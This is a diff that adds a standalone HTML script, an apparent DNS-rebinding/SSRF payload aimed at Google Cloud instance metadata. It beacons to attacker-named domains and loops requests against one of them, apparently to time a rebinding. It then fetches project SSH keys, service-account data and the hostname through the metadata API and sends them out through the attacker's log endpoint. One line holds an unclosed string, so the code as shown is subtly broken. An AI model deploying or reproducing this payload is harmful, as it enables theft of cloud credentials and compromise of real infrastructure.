@@ -1,0 +1,38 @@
+<script>
+var logTimeServer = 'time.ihackednasausinght.ml';
+var attackServer = 'demon.ihackednasausinght.ml';
+
+function log(data) {
+    var sreq = new XMLHttpRequest();
+    sreq.open('GET', 'http://' + logTimeServer + '/log?msg=' + encodeURI(data), true);
+    sreq.send();
+}
+
+function get(url) {
+    try {
+        var req = new XMLHttpRequest();
+        req.open('GET', url, false);
+        req.setRequestHeader('X-Google-Metadata-Request', 'True');
+        req.send(null);
+        if(req.status == 200)
+            return req.responseText;
+        else
+            return '[failed status=' + req.status + ']';
+    } catch(err) {
+        log(err);
+    }
+    return null;
+}
+
+log('Triggered in ' + window.location.href);
+
+for(var i = 0; i < 60; ++i) {
+    log('Loop ' + i);
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://' + logTimeServer + '/, false);
+    req.send();
+}
+log('SSH Keys: ' + get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json'));
+log('Service Accounts: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json'));
+log('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));
+</script>
